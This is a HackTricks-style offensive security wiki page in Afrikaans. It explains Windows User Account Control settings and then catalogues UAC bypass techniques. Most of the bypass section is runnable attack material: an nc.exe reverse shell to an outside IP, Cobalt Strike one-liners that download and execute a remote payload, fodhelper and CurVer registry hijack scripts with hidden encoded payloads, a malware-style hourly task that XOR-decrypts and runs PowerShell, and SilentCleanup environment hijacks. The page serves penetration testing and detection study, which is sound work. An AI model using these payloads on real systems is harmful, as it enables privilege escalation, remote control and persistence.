# UAC - Gebruikerrekeningbeheer

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Gebruikerrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is ’n kenmerk wat ’n **toestemmingsversoek vir aktiwiteite met verhoogde voorregte** moontlik maak. Toepassings het verskillende `integrity`-vlakke, en ’n program met ’n **hoë vlak** kan take uitvoer wat **die stelsel moontlik in gevaar kan stel**. Wanneer UAC geaktiveer is, **loop toepassings en take altyd onder die sekuriteitskonteks van ’n nie-administrateurrekening**, tensy ’n administrateur hierdie toepassings/take uitdruklik magtig om toegang op administrateurvlak tot die stelsel te hê wanneer hulle loop. Dit is ’n geriefskenmerk wat administrateurs teen onbedoelde veranderinge beskerm, maar word nie as ’n sekuriteitsgrens beskou nie.<sup>[[2]](#references)</sup>

Vir meer inligting oor integriteitsvlakke:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC in plek is, kry ’n administrateurgebruiker 2 tokens: ’n standaardgebruikertoken om gewone aksies op medium-integriteit uit te voer, en een met die administrateurvoorregte.

Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek in groot besonderhede hoe UAC werk en sluit die aanmeldproses, gebruikerservaring en UAC-argitektuur in.<sup>[[2]](#references)</sup> Administrateurs kan sekuriteitsbeleide gebruik om te konfigureer hoe UAC spesifiek vir hul organisasie werk, plaaslik (met secpol.msc), of dit in ’n Active Directory-domeinomgewing konfigureer en deur Group Policy Objects (GPO) uitstuur. Die verskillende instellings word [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) in besonderhede bespreek. Daar is 10 Group Policy-instellings wat vir UAC ingestel kan word. Die volgende tabel verskaf meer besonderhede:

| Group Policy-instelling                                                                                                                                                                                                                                                                                                                                                           | Registry-sleutel                | Verstekinstelling                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Gebruikerrekeningbeheer: Admin Approval Mode vir die ingeboude Administrator-rekening](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Gedeaktiveer)                                             |
| [Gebruikerrekeningbeheer: Gedrag van die versoek om verhoogde voorregte vir administrateurs in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Vra vir toestemming vir nie-Windows-binaries op die veilige werkskerm) |
| [Gebruikerrekeningbeheer: Gedrag van die versoek om verhoogde voorregte vir standaardgebruikers](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Vra vir geloofsbriewe op die veilige werkskerm)         |
| [Gebruikerrekeningbeheer: Bespeur toepassinginstallasies en vra vir verhoogde voorregte](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Geaktiveer; by verstek op Enterprise gedeaktiveer)           |
| [Gebruikerrekeningbeheer: Verhoog slegs uitvoerbare lêers wat onderteken en gevalideer is](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Gedeaktiveer)                                             |
| [Gebruikerrekeningbeheer: Verhoog slegs UIAccess-toepassings wat op veilige plekke geïnstalleer is](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Geaktiveer)                                              |
| [Gebruikerrekeningbeheer: Laat alle administrateurs in Admin Approval Mode loop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Geaktiveer)                                              |
| [Gebruikerrekeningbeheer: Laat UIAccess-toepassings toe om vir verhoogde voorregte te vra sonder om die veilige werkskerm te gebruik](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Gedeaktiveer)                                             |
| [Gebruikerrekeningbeheer: Skakel na die veilige werkskerm wanneer daar vir verhoogde voorregte gevra word](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Geaktiveer)                                              |
| [Gebruikerrekeningbeheer: Virtualiseer mislukte lêer- en registry-skryfpogings na per-gebruiker-liggings](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Geaktiveer)                                              |

### Beleide vir die installering van sagteware op Windows

Die **plaaslike sekuriteitsbeleide** ("secpol.msc" op die meeste stelsels) is by verstek gekonfigureer om **te voorkom dat nie-administrateurgebruikers sagteware-installasies uitvoer**. Dit beteken dat selfs al kan ’n nie-administrateurgebruiker die installeerder vir jou sagteware aflaai, hulle dit nie sonder ’n administrateurrekening sal kan uitvoer nie.

### Registry-sleutels om UAC te dwing om vir verhoogde voorregte te vra

As ’n standaardgebruiker sonder administrateurregte kan jy verseker dat die "standaard"-rekening **deur UAC gevra word vir geloofsbriewe** wanneer dit sekere aksies probeer uitvoer. Hiervoor moet sekere **registry-sleutels** gewysig word, waarvoor jy administrateurtoestemmings nodig het, tensy daar ’n **UAC bypass** is, of die aanvaller reeds as administrateur aangemeld is.

Selfs al is die gebruiker in die **Administrators**-groep, dwing hierdie veranderinge die gebruiker om **hul rekeninggeloofsbriewe weer in te voer** om administratiewe aksies uit te voer.

**In die praktyk is dit slegs nuttig wanneer jy reeds ’n verhoogde token, ’n UAC bypass, of ’n verkeerde konfigurasie het wat jou toelaat om hierdie sleutels te verander; andersins word die registry-skryfpoging self geblokkeer.**

Die registry-sleutels en inskrywings wat jy moet verander, is die volgende (met hul verstekwaardes tussen hakies):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

Dit kan ook handmatig deur die Local Security Policy-nutsding gedoen word. Sodra dit verander is, vra administratiewe bewerkings die gebruiker om hul geloofsbriewe weer in te voer.

### Nota

**Gebruikerrekeningbeheer is nie ’n sekuriteitsgrens nie.** Daarom kan standaardgebruikers nie uit hul rekeninge ontsnap en administrateurregte verkry sonder ’n plaaslike privilege escalation-exploit nie.

### Vra ’n gebruiker vir 'volle toegang tot die rekenaar'

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC-voorregte

- Internet Explorer Protected Mode gebruik integriteitskontroles om te verhoed dat prosesse met ’n hoë integriteitsvlak (soos webblaaiers) toegang kry tot data met ’n lae integriteitsvlak (soos die vouer met tydelike internetlêers). Dit word gedoen deur die blaaier met ’n token met ’n lae integriteitsvlak te laat loop. Wanneer die blaaier toegang probeer kry tot data wat in die sone met ’n lae integriteitsvlak gestoor is, kontroleer die bedryfstelsel die proses se integriteitsvlak en verleen toegang dienooreenkomstig. Hierdie kenmerk help voorkom dat remote code execution-aanvalle toegang tot sensitiewe data op die stelsel kry.
- Wanneer ’n gebruiker by Windows aanmeld, skep die stelsel ’n toegangstoken wat ’n lys van die gebruiker se voorregte bevat. Voorregte word gedefinieer as die kombinasie van ’n gebruiker se regte en vermoëns. Die token bevat ook ’n lys van die gebruiker se aanmeldbewyse, wat gebruik word om die gebruiker by die rekenaar en netwerkhulpbronne te staaf.

### Autoadminlogon

Om Windows op te stel om outomaties tydens die opstart by ’n spesifieke gebruiker aan te meld, stel die **`AutoAdminLogon`-registersleutel**. Dit is nuttig vir kiosk-omgewings of vir toetsdoeleindes. Gebruik dit slegs op veilige stelsels, aangesien dit die wagwoord in die register blootstel.

Stel die volgende sleutels met die Registerredigeerder of `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = gebruikersnaam
  - `DefaultPassword` = wagwoord

Om na normale aanmeldgedrag terug te keer, stel `AutoAdminLogon` op 0.

## UAC bypass

> [!TIP]
> Let daarop dat as jy grafiese toegang tot die slagoffer het, UAC bypass eenvoudig is, aangesien jy net op "Yes" kan klik wanneer die UAC-aanporboodskap verskyn

UAC bypass is nodig in die volgende situasie: **UAC is geaktiveer, jou proses loop in ’n konteks met medium integriteit, en jou gebruiker behoort aan die administrateursgroep**.

Dit is belangrik om te noem dat dit **baie moeiliker is om UAC te omseil wanneer dit op die hoogste sekuriteitsvlak (Always) gestel is as wanneer dit op enige van die ander vlakke (Default) gestel is.**

### Vinnige triage vanuit ’n medium-integriteit-dop

Voordat jy ’n bypass probeer, bevestig dat jy in die regte scenario is en bepaal die gasheer se bouweergawe sodat jy bekende werkende metodes kan kies:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Praktiese notas:
- As `EnableLUA=0` is, het jy nie ’n bypass nodig nie: enige admin-token kan direk hoë integriteit aanvra.
- `ConsentPromptBehaviorAdmin=2` of `5` is die algemene scenario vir auto-elevate / COM-gebaseerde bypasses.
- `Always Notify` verhoog die moeilikheidsgraad, maar toets steeds die presiese build eerder as om mislukking te aanvaar: UACME hou steeds rekord van sommige `AlwaysNotify compatible`-metodes op moderne Windows-builds.<sup>[[3]](#references)</sup>

### UAC gedeaktiveer

As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**), kan jy **’n reverse shell met admin-regte uitvoer** (hoë integriteitsvlak) met iets soos:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC-bypass met token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + herbruikbare debug object

Die AppInfo local RPC-koppelvlak `201ef99a-7fa0-444c-9399-19ba84f12a1a` kan ’n process skep met debugging geaktiveer. Processes wat deur debugging op dieselfde thread geskep word, deel die thread se debug object; ’n skeppings-debug event bevat ’n process handle met volle toegang, selfs wanneer die RPC-resultaat self slegs beperkte toegang verleen. Dit maak hergebruik van ’n debug object ’n UAC-primitief vir ’n gebruiker met medium integrity wat lid van die Administrators-groep is.<sup>[[11]](#references)[[12]](#references)</sup>

’n Praktiese ketting is:<sup>[[11]](#references)[[12]](#references)</sup>

1. Roep die local RPC-metode aan (direk of via `NdrAsyncClientCall`) om ’n nie-verhoogde opofferingsprocess te skep met debugging geaktiveer.
2. Doen navraag oor `ProcessDebugObjectHandle` met `NtQueryInformationProcess`, ontkoppel dit met `NtRemoveProcessDebug`, behou die object en beëindig die opofferingsprocess.
3. Gebruik dieselfde RPC-koppelvlak om ’n vertroude, outomaties-verhoogde process te skep en koppel dan die gestoorde object aan die aanroepende thread met `DbgUiSetThreadDebugObject`.
4. Roep `WaitForDebugEvent` aan en gebruik die process handle van die `CREATE_PROCESS_DEBUG_EVENT`; dupliseer dit met `NtDuplicateObject` voordat jy voortgaan.
5. Gee die gedupliseerde handle aan `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` en begin die payload met ’n uitgebreide startup-info-struktuur. Dit hergebruik die verhoogde process-konteks en gee die child ’n vertroude ouer-verhouding.

Soek na die kort reeks eerder as net die outomaties-verhoogde binary: skepping van ’n process via AppInfo local RPC, `ProcessDebugObjectHandle`-navrae, debugger-ontkoppeling/herkoppeling, ’n onmiddellike skeppings-debug event, handle-duplisering en ’n child waarvan die aangetekende ouer nie ooreenstem met die process wat die skeppings-API’s uitgevoer het nie.<sup>[[12]](#references)</sup>

### **Baie** Basiese UAC-"bypass" (volle lêerstelseltoegang)

As jy ’n shell het met ’n gebruiker wat deel is van die Administrators-groep, kan jy die **C$-gedeelde vouer** via SMB (lêerstelsel) plaaslik op ’n nuwe skyf mount; dan sal jy **toegang tot alles in die lêerstelsel hê** (selfs die Administrator-tuisvouer).

> [!WARNING]
> **Dit lyk asof hierdie truuk nie meer werk nie**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC-bypass met Cobalt Strike

Die Cobalt Strike-tegnieke sal slegs werk as UAC nie op sy maksimum sekuriteitsvlak gestel is nie.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### Verhoogde COM-koppelvlakke (`ICMLuaUtil` / `CMSTPLUA`)

Outomaties verhoogde COM-objekte bly ’n praktiese UAC-aanvalsoppervlak op moderne weergawes. UACME lys steeds `ICMLuaUtil` as werkend op huidige Windows-weergawes, en aanvalsgereedskap pas `CMSTPLUA` voortdurend aan deur ’n interaktiewe werkskermproses en 64-bis-uitvoering te kombineer, en soms ook PEB-/prosesvermomming te gebruik voordat die COM Elevation Moniker aangeroep word.<sup>[[3]](#references)</sup>

Praktiese wenke:
- Verkies ’n **64-bis**-proses in die gebruiker se **interaktiewe sessie** (gewoonlik `explorer.exe` of ’n onderliggende proses daarvan).
- As ’n rou shell misluk, probeer weer met ’n BOF-/UACME-implementering eerder as ’n naïewe `CreateProcess`-omhulsel.
- Verwag dat die kindproses in ’n **afsonderlike verhoogde proses** uitgevoer word; baie BOF’s verhoog nie die huidige beacon in plek nie.

### KRBUACBypass

Dokumentasie en hulpmiddel by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC-bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) is ’n versameling UAC-bypass-tegnieke. Stel dit saam met Visual Studio of MSBuild; die bouproses skep verskeie uitvoerbare lêers (byvoorbeeld `Source\Akagi\output\x64\Debug\Akagi.exe`), dus kies die metode wat geskik is vir die teiken se weergawe.<sup>[[3]](#references)</sup>\
Wees versigtig: sommige bypasses begin sigbare programme of aanporboodskappe wat die gebruiker kan waarsku.<sup>[[3]](#references)</sup>

UACME gee die **bouweergawe aan vanaf wanneer elke tegniek begin werk het**.<sup>[[3]](#references)</sup> Jy kan soek na ’n tegniek wat jou weergawes raak:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Ook, deur [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history)-bladsy te gebruik, kry jy die Windows-vrystelling `1607` uit die bouweergawes.

’n Praktiese werkvloei is om eers die **gasheerbounommer te beoordeel**, en dan eers die ooreenstemmende metode uit te voer:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` vergelyk die plaaslike build vinnig met sy bekende UAC-metodes, wat nuttig is om dooie PoCs vinnig uit te skakel.<sup>[[4]](#references)</sup>
- `UACME` bly die beste openbare katalogus om ’n bypass aan ’n spesifieke build te koppel. Weergawe 3.7.1 het metodes 83–85 bygevoeg, terwyl die vorige weergawe bestaande metodes weer teen **Windows 11 25H2** getoets het; gaan die metodetabel en vrystellingsnotas weer na eerder as om aan te neem dat ’n ou PoC steeds onveranderd van toepassing is.<sup>[[3]](#references)[[9]](#references)</sup>

### WNF/UIAccess-kettings wat met Always Notify versoenbaar is (UACME 3.7.1)

`Always Notify` skakel nie elke UAC-bypass uit nie. UACME 3.7.1 implementeer drie nuwe x64-metodes wat gebruikerbeheerbare omgewings-/protokoltoestand met gedrag van verhoogde geskeduleerde take of UIAccess kombineer, en merk al drie as `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** herlei `SystemRoot` sodat die WNF-geaktiveerde `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` verhoogde `taskhostw.exe` laat side-load met `unifiedconsent.dll`. UACME volg dit vanaf Windows 10 build 19041.
- **84 — TabTip:** gebruik dieselfde omgewingsveranderlike-primitief teen UIAccess `TabTip.exe`, wat `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` of `rsaenh.dll` laai, afhangend van die build; pivot dan vanuit die gevolglike UIAccess-konteks met hoë integriteit. UACME volg dit vanaf Windows 8.1 / Server 2016.
- **85 — Narrator:** kaap die per-gebruiker-protokol `feedback-hub`, beheer Narrator met `Alt+CapsLock+F`, en begin dan ’n skryfbare kopie van `osk.exe` wat `OskSupport.dll` side-load. Dit vereis ’n interaktiewe lessenaar en word vanaf Windows 10 1809 / Server 2019 gevolg.

Nadat jy die payload-eenhede en Akagi gebou het soos deur UACME gedokumenteer, roep die ooreenstemmende metodenommer aan (die opsionele opdrag gebruik by verstek `cmd.exe`):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Metodes 84 en 85 is afhanklik van UIAccess/desktop-interaksie, moet dus nie verwag dat hulle onveranderd vanuit Session 0 of ’n nie-interaktiewe diensshell sal werk nie. Al drie manipuleer omgewings-/protokolstatus en plaas DLL’s; inspekteer die implementering en verwyder daardie artefakte ná toetsing.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertroude binêre `fodhelper.exe` word outomaties verhoogde regte op moderne Windows. Wanneer dit geloods word, raadpleeg dit die per-gebruiker-registerpad hieronder sonder om die `DelegateExecute`-werkwoord te valideer. Deur ’n opdrag daar te plaas, kan ’n Medium Integrity-proses (waarvan die gebruiker ’n lid van Administrators is) ’n High Integrity-proses sonder ’n UAC-aanporboodskap laat begin.

Registerpad wat deur fodhelper geraadpleeg word:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell-stappe (stel jou payload in en aktiveer dan)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Notas:
- Werk wanneer die huidige gebruiker 'n lid van Administrators is en die UAC-vlak verstek/lenient is (nie Always Notify met ekstra beperkings nie).
- Gebruik die `sysnative`-pad om 'n 64-bis PowerShell vanuit 'n 32-bis-proses op 64-bis Windows te begin.
- Payload kan enige opdrag wees (PowerShell, cmd of 'n EXE-pad). Vermy aanpor-UI's vir stealth.

#### `ComputerDefaults.exe`-trigger vir dieselfde `ms-settings`-hanteerder

`ComputerDefaults.exe` los dieselfde per-gebruiker `ms-settings\Shell\Open\command`-assosiasie as `fodhelper.exe` op.<sup>[[13]](#references)[[14]](#references)</sup> Nadat jy die verstekopdrag en leë `DelegateExecute`-waarde hierbo gestel het, gebruik `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` as 'n alternatiewe trigger; herhaal nie die registeropstelling nie.<sup>[[13]](#references)[[14]](#references)</sup> Die medium-integrity-administrateur- en UAC-beleid-voorvereistes in die `fodhelper.exe`-notas hierbo geld steeds.<sup>[[2]](#references)[[3]](#references)</sup> UACME katalogiseer hierdie trigger vanaf Windows 10 RS4 (build 17134), dus verifieer dit op die teikenbuild.<sup>[[3]](#references)</sup>

#### CurVer/uitbreiding-hijack-variant (slegs HKCU)

Onlangse voorbeelde wat `fodhelper.exe` misbruik, vermy `DelegateExecute` en herlei eerder die `ms-settings` ProgID via die per-gebruiker `CurVer`-waarde. Die outomaties verhoogde binêre lêer los steeds die hanteerder onder `HKCU` op, dus is geen admin-token nodig om die sleutels te plaas nie:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Sodra dit verhoogde voorregte het, **deaktiveer** malware gewoonlik toekomstige aanwysings deur `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` op `0` te stel, waarna dit verdere ontduiking van verdediging uitvoer (bv. `Add-MpPreference -ExclusionPath C:\ProgramData`) en volharding herskep om met hoë integriteit te loop. ’n Tipiese volhardingstaak stoor ’n **XOR-geënkripteerde PowerShell-script** op skyf en dekodeer/voer dit elke uur in geheue uit:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Hierdie variant maak steeds die dropper skoon en laat net die staged payloads agter, wat beteken dat opsporing moet staatmaak op monitering van die **`CurVer`-kaping**, peuterwerk met `ConsentPromptBehaviorAdmin`, die skep van Defender-uitsluitings, of geskeduleerde take wat PowerShell in die geheue dekripteer.<sup>[[5]](#references)</sup>

### UAC-bypass via `SilentCleanup`-taak (`HKCU\Environment\windir`)

`SilentCleanup` begin `cleanmgr.exe` met die hoogste voorregte en brei `%windir%` uit vanuit die gebruiker se omgewing. As jy beheer het oor `HKCU\Environment\windir`, kan jy daardie uitbreiding na ’n arbitrêre opdrag herlei en hoë integriteit verkry sonder ’n toestemmingsdialoog.<sup>[[8]](#references)</sup> Hierdie metode is steeds die moeite werd om op onlangse builds te toets, want UACME hou die tegniek aktief en onlangse probleemnasporing dui daarop dat Windows 11 24H2 dalk net klein aanpassings aan die aanhalingstekens vereis.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

As die taak die pad op daardie build aanhaal, probeer weer met ’n payload wat met ’n aanhalingsteken eindig (byvoorbeeld `cmd.exe"`). Maak altyd `HKCU\Environment\windir` skoon nadat jy getoets het.

#### Meer UAC bypass

Baie klassieke UAC bypasses wat UI-vloeie, COM-objekte of interaksie met die werkskerm misbruik, vereis ’n **volledige interaktiewe sessie** met die slagoffer; ’n gewone `nc.exe`-shell of ’n diens wat in **Session 0** loop, is dikwels nie genoeg nie.

Jy kan dit dikwels oplos deur ’n **meterpreter**-sessie te gebruik. Migreer na ’n **proses** waarvan die **Session**-waarde gelyk is aan **1**:

![Wys ms-settings na ’n pasgemaakte uitbreiding (.thm) en koppel daardie uitbreiding aan ons payload - Meer UAC bypass: Jy kan dit met ’n meterpreter-sessie doen. Migreer na ’n proses waarvan die Session...](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC bypass met GUI

As jy toegang tot ’n **GUI het, kan jy eenvoudig die UAC-aanporboodskap aanvaar** wanneer dit verskyn; jy het nie regtig ’n tegniese bypass nodig nie. Daarom is dit dikwels genoeg om ’n GUI-sessie te verkry om die praktiese struikelblok wat UAC byvoeg, te omseil.

Verder, as jy ’n GUI-sessie kry wat iemand gebruik het (moontlik via RDP), sal daar **sommige nutsgoed wees wat as administrator loop**. Van daar af kan jy byvoorbeeld **’n cmd direk as admin laat loop** sonder dat UAC jou weer vra, soos met [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan ’n bietjie meer **stealthy** wees.

### Geraasmakende brute-force UAC bypass

As geraas aanvaarbaar is, kan ’n nutsmiddel soos [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) herhaaldelik om verhoging van voorregte vra totdat die gebruiker dit aanvaar.

### Jou eie bypass - Basiese UAC bypass-metodologie

As jy na **UACME** kyk, sal jy sien dat **baie UAC bypasses DLL hijacking misbruik** (dikwels deur ’n verhoogde binary ’n aanvaller-beheerde DLL vanaf ’n skryfbare pad te laat laai). [Lees dit om te leer hoe om ’n DLL hijacking-kwesbaarheid te vind](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Vind ’n binary wat **outomaties verhoog word** (kyk of dit op ’n hoë integriteitsvlak loop wanneer dit uitgevoer word).
2. Gebruik procmon om "**NAME NOT FOUND**"-gebeurtenisse te vind wat kwesbaar kan wees vir **DLL Hijacking**.
3. Jy sal waarskynlik die DLL binne sekere **beskermde paaie** (soos C:\Windows\System32) moet **skryf**, waar jy nie skryftoestemmings het nie. Jy kan dit omseil deur:
   1. **wusa.exe**: Windows 7, 8 en 8.1. Dit laat jou toe om die inhoud van ’n CAB-lêer binne beskermde paaie uit te pak (omdat hierdie nutsmiddel vanaf ’n hoë integriteitsvlak uitgevoer word).
   2. **IFileOperation**: Windows 10.
4. Berei ’n **script** voor om jou DLL na die beskermde pad te kopieer en die kwesbare, outomaties verhoogde binary uit te voer.

### Nog ’n UAC bypass-tegniek

Dit behels dat jy dophou of ’n **autoElevated binary** probeer om die **naam/pad** van ’n **binary** of **command** wat uitgevoer moet word, uit die **registry** te **lees** (dit is interessanter as die binary hierdie inligting in **HKCU** soek).

### UAC bypass via `SysWOW64\iscsicpl.exe` + DLL hijack met gebruiker se `PATH`

